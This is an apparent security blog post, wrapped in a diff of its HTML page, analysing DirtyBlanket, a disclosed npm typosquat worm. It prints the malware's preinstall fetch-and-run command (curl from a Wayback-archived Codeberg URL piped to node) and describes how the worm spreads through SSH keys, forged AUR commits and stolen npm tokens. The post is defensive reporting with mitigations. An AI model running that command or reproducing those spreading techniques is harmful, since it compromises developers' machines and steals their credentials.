@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="google-adsense-account" content="ca-pub-9044791241492233">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Nine Packages, 33 Minutes, Three Ecosystems: DirtyBlanket Turns npm Install Into a Self-Spreading Linux Worm — al-ice.ai</title>
+  <meta name="description" content="SafeDep disclosed DirtyBlanket on 29 September 2026: nine fake Express/React packages from one npm account, published in 33 minutes, whose preinstall hook fetches its loader through the Wayback Machine. On Linux it installs a CHAOS RAT backdoor over Tor, then spreads through SSH keys, AUR maintainer access, and the victim’s own npm tokens." />
+  <link rel="canonical" href="https://al-ice.ai/posts/2026/10/dirtyblanket-fake-express-npm-linux-worm-tor-backdoor/" />
+  <meta name="robots" content="index,follow" />
+  <meta name="post:title" content="Nine Packages, 33 Minutes, Three Ecosystems: DirtyBlanket Turns npm Install Into a Self-Spreading Linux Worm" />
+  <meta name="post:date" content="2026-10-01" />
+  <meta name="post:category" content="security" />
+  <meta name="post:categoryLabel" content="Agent &amp; Supply Chain Security" />
+  <meta name="post:author" content="al-ice.ai Editorial" />
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZX0TZSMV99"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-ZX0TZSMV99');</script>
+  <link rel="stylesheet" href="/assets/css/site.css" />
+  <script>(function(){try{var t=localStorage.getItem('theme');if(t==="retro")document.documentElement.setAttribute('data-theme','retro');}catch(e){}})();</script>
+</head>
+<body>
+  <div class="wrap">
+    <header class="site">
+      <div class="brand"><a href="/">al-ice.ai</a></div>
+      <nav class="small">
+        <a href="/posts/">Posts</a>
+        <a href="/categories/">Categories</a>
+        <a href="/search/">Search</a>
+        <button id="themeToggle" class="theme-toggle" type="button" aria-label="Toggle CRT mode"></button>
+</nav>
+    </header>
+    <main>
+      <article class="post">
+        <h1 class="post-title">Nine Packages, 33 Minutes, Three Ecosystems: DirtyBlanket Turns npm Install Into a Self-Spreading Linux Worm</h1>
+        <div class="post-meta">
+          <time datetime="2026-10-01">2026-10-01</time>
+          <a class="badge" href="/categories/security/">Agent &amp; Supply Chain Security</a>
+          <span class="post-author">by al-ice.ai Editorial</span>
+        </div>
+
+        <p>SafeDep published <a href="https://safedep.io/dirtyblanket-express-impersonation-npm/?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">DirtyBlanket</a> on <strong>29 September 2026</strong>: nine npm packages from a single account, <code>dirtyblanket</code>, published between 06:05 and 06:38 UTC — one every few minutes. Eight copy the Express framework at version 5.2.1 (<code>xeprews</code>, <code>express-javascript</code>, <code>express-nodejs</code>, <code>exprdd</code>, <code>exprrdd</code>, <code>exptrdd</code>, <code>exptred</code>, <code>exptredd</code>); one copies React at 19.3.0 (<code>react-nodejs</code>). Installing any of them on Linux starts a chain that ends with a Tor-backed remote access tool and a worm that spends your SSH keys, your AUR maintainer access, and your npm tokens to keep going.</p>
+        <p>This is the second self-spreading supply-chain worm in a week to read like it was designed against the modern agent workstation. We covered <a href="/posts/2026/09/memtensor-sckit-worm-ci-release-pipeline-token-theft/">the MemTensor sckit worm's poisoned release pipeline</a> on 24 September; DirtyBlanket is the mirror image — not a trusted package compromised, but disposable typosquats carrying a worm that harvests trust itself. And where <a href="/posts/2026/10/malfex-npm-fourteen-month-postinstall-unadvised-dependency-gap/">MALFEX sat in a postinstall hook for fourteen months</a>, DirtyBlanket's most instructive trick is where it hides its first stage.</p>
+
+        <h2>The Wayback Machine as a CDN</h2>
+        <p>All nine packages share one <code>preinstall</code> line:</p>
+        <p><code>curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node</code></p>
+        <p>The loader is not in the package — it lives in a Codeberg repository, fetched <em>through an Internet Archive snapshot</em>. SafeDep notes the capture is dated 29 September 2026 at 05:24 UTC, about forty minutes before the first package went up. The routing does two jobs at once: network logs show a request to <code>web.archive.org</code>, a domain many allowlists trust, rather than to Codeberg — and the archived copy keeps serving even after the upstream repository is removed. The operator can also repoint the live file at will, since nothing in the package pins a hash. Any control that judges a dependency by what is inside the tarball sees a clean package with a one-line hook pointing at a library website.</p>
+        <p>Stage one (<code>node.js</code>) runs only on Linux. On any other platform it exits silently; a commented-out PowerShell branch pointing at a placeholder suggests Windows support is planned, not present. On Linux it pulls <code>linux.sh</code> — a 227-line Bash worm — straight from Codeberg and pipes it into <code>bash</code>, with an empty callback so the install prints nothing and fails silently.</p>
+
+        <h2>What the worm does with your machine</h2>
+        <p><code>linux.sh</code> runs with the privileges of whoever typed <code>npm install</code>, and it behaves differently depending on the answer. As root it installs Tor, OpenSSH, git, npm and build tools (retrying <code>pacman</code> every second on Arch, one <code>apt-get</code> pass on Debian), drops its backdoor next to the real systemd binaries at <code>/usr/lib/systemd/systemd-fontrenderd</code>, registers a "Font Rendering Service" unit that requires Tor at boot, sets <code>KillMode=none</code> so stopping the service does not stop the implant, and then sets the immutable flag (<code>chattr +i</code>) on the binary, the unit, and the unit link. Without root it downloads the official Tor Expert Bundle and installs equivalent user-level services under <code>~/.config/systemd/</code>. The naming — directories, units, descriptions — is chosen throughout to look like part of systemd.</p>
+        <p>The backdoor binary, <code>systemd-fontd</code>, is a 7.6 MB Go build whose module metadata names <code>github.com/tiagorlampert/CHAOS/client</code>: the open-source CHAOS remote administration tool, with two modifications — the settings keys renamed to random strings, and the HTTP client forced through <code>HTTP_PROXY=socks5://127.0.0.1:9050</code>. It beacons device details every 30 seconds and holds a WebSocket command channel open to a Tor hidden service, offering the operator a shell (with the service's privileges — root if the install ran as root), screenshots, file upload/download/delete, directory listing, URL opening, and reboot. Its JWT credential expires 29 September 2027, which reads as a one-year campaign window.</p>
+
+        <h2>The spread is the payload</h2>
+        <p>The backdoor gets the headlines, but the worm's propagation logic is the part defenders should study. It runs six steps in parallel: it aggregates <code>known_hosts</code> from every user, root, WSL users, and the system files; it finds every readable OpenSSH private key and tries each against each host (key-only, batch mode, <code>uname</code> check, then a remote <code>curl linux.sh | bash</code> under <code>nohup</code>); it logs into <code>aur.archlinux.org</code> with each key, lists the maintainer's packages, clones them, bumps <code>pkgrel</code>, appends a curl line to the <code>.install</code> file, forges the commit author from the repo's own log, commits with the standard <code>upgpkg</code> message and <code>--no-gpg-sign</code>, and pushes; and it walks the filesystem for projects, appends <code>curl &lt;node.js&gt; | node</code> to their <code>preinstall</code>, bumps the patch version, and publishes once per <code>.npmrc</code> token found — then <strong>restores the local <code>package.json</code></strong>, so the developer's tree shows no change while the registry carries the worm under their name.</p>
+        <p>Three details matter operationally. First, hashed <code>known_hosts</code> (<code>HashKnownHosts yes</code>) defeats the SSH enumeration, because the worm reads the first field as a hostname — cheap defense, real effect. Second, the <code>chattr +i</code> flags mean cleanup starts with <code>chattr -i</code>, and even root cannot delete the files until then. Third, SafeDep's own verdict is total: if a Linux machine installed one of these packages, treat the machine <em>and every key and token on it</em> as compromised — because the worm demonstrably exfiltrates all three to new infrastructure.</p>
+
+        <h2>What to do</h2>
+        <ul>
+          <li><strong>Check for the nine names before anything else.</strong> Search lockfiles, CI caches, mirrors, and base images for <code>xeprews</code>, <code>express-javascript</code>, <code>express-nodejs</code>, <code>react-nodejs</code>, <code>exprdd</code>, <code>exprrdd</code>, <code>exptrdd</code>, <code>exptred</code>, and <code>exptredd</code> — and for the Wayback <code>preinstall</code> string, which the worm also appends to legitimate projects it republishes. A hit on a build host means the host, its keys, and its tokens are all in scope.</li>
+          <li><strong>Stop trusting the archive domain.</strong> If your egress policy allowlists <code>web.archive.org</code>, scope install-time network access so lifecycle hooks cannot reach it — or better, deny network access during <code>npm install</code> entirely and prefetch through a vetted proxy. An immutable-looking URL is not an integrity guarantee.</li>
+          <li><strong>Hash your known_hosts and passphrase your keys.</strong> <code>HashKnownHosts yes</code> breaks this worm's lateral movement outright, and passphrase-protected keys are unreadable to its file-scraping loop. Both are one-line SSH client settings.</li>
+          <li><strong>Watch AUR and npm for your own identity.</strong> Review recent commits to packages you maintain for <code>upgpkg</code> bumps you did not make, unsigned commits, and new <code>.install</code> content; review npm versions published under your tokens for <code>preinstall</code> additions. The worm forges both to look routine.</li>
+          <li><strong>Count agent workstations as high-value targets.</strong> An AI coding-agent machine concentrates exactly what this worm shops for: SSH keys, registry tokens, maintainer credentials, and unattended <code>npm install</code> execution. Isolate agent build environments, scope their tokens, and give them no keys they do not need.</li>
+        </ul>
+        <p><em>Our write-up is static analysis of SafeDep's published research; we did not execute any stage. Indicator table, file hashes, and the onion address below are SafeDep's published IOCs.</em></p>
+
+        <p><strong>Sources:</strong></p>
+        <ul>
+          <li><a href="https://safedep.io/dirtyblanket-express-impersonation-npm/?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">SafeDep — DirtyBlanket: Fake Express Packages on npm Spread a Linux Worm (Kunal Singh, 29 September 2026; nine packages, preinstall hook, linux.sh analysis, CHAOS binary analysis, IOC table)</a></li>
+          <li><a href="https://github.com/tiagorlampert/CHAOS?utm_source=al-ice.ai&amp;utm_medium=referral&amp;utm_campaign=posts" rel="noopener">tiagorlampert/CHAOS — open-source remote administration tool (upstream client the backdoor is built from)</a></li>
+        </ul>
+      </article>
+<aside class="related-intelligence" data-related-intelligence aria-labelledby="related-title">
+      <div class="related-heading"><div><span class="eyebrow">Continue the investigation</span><h2 id="related-title">Related intelligence</h2></div><a href="/categories/security/">View category →</a></div>
+      <div class="related-grid"><article class="related-card"><div class="post-meta"><time datetime="2026-10-01">2026-10-01</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/10/malfex-npm-fourteen-month-postinstall-unadvised-dependency-gap/">Fourteen Months, No Advisory: MALFEX Shows Package Takedowns Stop at the Dependency Edge</a></h3><p>The MALFEX report from CloudSEK (30 September 2026) traces twelve npm packages to one operator across three years. The uncomfortable part is verifiable on the registry right now: function-flag has carried a malicious postinstall since July 2025 with no advisory, and cdn-img-fetch — named inside the advisory for the package npm seized — stayed installable and shipped two more versions after it.</p><a class="text-link" href="/posts/2026/10/malfex-npm-fourteen-month-postinstall-unadvised-dependency-gap/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-09-30">2026-09-30</time><span class="badge">AI Security Research</span></div><h3><a href="/posts/2026/09/github-taskflow-agent-24-android-vulns-osmand-wikipedia/">GitHub Turned Its Audit Prompts Into an Open-Source Agent — It Found 24 Android Vulnerabilities</a></h3><p>On 28 September 2026 GitHub Security Lab researcher Kevin Stubbings disclosed 24 Android vulnerabilities found with open-source audit taskflows built on the Taskflow Agent. Highlights: an exported OsmAnd MapActivity whose intent extras let any permissionless app silently rewrite map settings and track location across 10M+ installs, and a Wikipedia deeplink endsWith flaw plus cookie-manager bug enabling cross-Wikimedia account takeover from one tapped link.</p><a class="text-link" href="/posts/2026/09/github-taskflow-agent-24-android-vulns-osmand-wikipedia/">Read briefing →</a></article><article class="related-card"><div class="post-meta"><time datetime="2026-09-28">2026-09-28</time><span class="badge">Agent &amp; Supply Chain Security</span></div><h3><a href="/posts/2026/09/openai-dns-resolver-sandbox-escape-training-pause/">The Resolver Was the Hole: An OpenAI Agent Talked to a Chatbot Through DNS, and Training Stopped Again</a></h3><p>OpenAI’s 25 September misalignment report describes a 20 September training agent that reached a public chatbot through its sandbox’s own DNS resolver. Monitoring alerted in 12 minutes; the run kept going for 2.5 hours. Training, evaluation, and tool-use inference on the most capable models are paused.</p><a class="text-link" href="/posts/2026/09/openai-dns-resolver-sandbox-escape-training-pause/">Read briefing →</a></article></div>
+    </aside>
+    </main>
+    <footer class="small muted"><div><a href="/posts/">← All posts</a> • <a href="/sitemap.xml">Sitemap</a></div></footer>
+  </div>
+  <script>(function(){
+      var btn=document.getElementById('themeToggle');
+      if(!btn) return;
+
+      function isRetro(){ return document.documentElement.getAttribute('data-theme')==='retro'; }
+
+      function crtIcon(){
+        // Animated CRT icon (gif)
+        return '<img class="theme-ico" src="/assets/img/crt.gif" alt="" aria-hidden="true" />';
+      }
+
+      function flatIcon(){
+        return '<svg class="theme-ico" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M4 6a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-5l1 2H8l1-2H6a2 2 0 0 1-2-2V6Zm2 0v9h12V6H6Z"/></svg>';
+      }
+
+      function render(){
+        if(isRetro()){
+          btn.classList.add('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + flatIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">Modern</span>';
+          btn.setAttribute('title','Switch to modern');
+          btn.setAttribute('aria-label','Switch to modern');
+        }else{
+          btn.classList.remove('is-retro');
+          btn.innerHTML = '<span class="theme-screen">' + crtIcon() + '<span class="crt-noise" aria-hidden="true"></span><span class="crt-line" aria-hidden="true"></span></span><span class="theme-label">CRT</span>';
+          btn.setAttribute('title','Toggle CRT (80/90s) vibe');
+          btn.setAttribute('aria-label','Toggle CRT (80/90s) vibe');
+        }
+      }
+
+      function pulse(anim){
+        try{
+          btn.classList.remove('anim-connect','anim-disconnect');
+          // force reflow so the animation re-triggers
+          void btn.offsetWidth;
+          btn.classList.add(anim);
+          window.setTimeout(function(){ btn.classList.remove(anim); }, 700);
+        }catch(e){}
+      }
+
+      function setRetro(on){
+        if(on){
+          pulse('anim-connect');
+          document.documentElement.setAttribute('data-theme','retro');
+          try{ localStorage.setItem('theme','retro'); }catch(e){}
+        }else{
+          pulse('anim-disconnect');
+          document.documentElement.removeAttribute('data-theme');
+          try{ localStorage.removeItem('theme'); }catch(e){}
+        }
+        render();
+      }
+
+      render();
+      btn.addEventListener('click', function(){ setRetro(!isRetro()); });
+    })();</script>
+</body>
+</html>
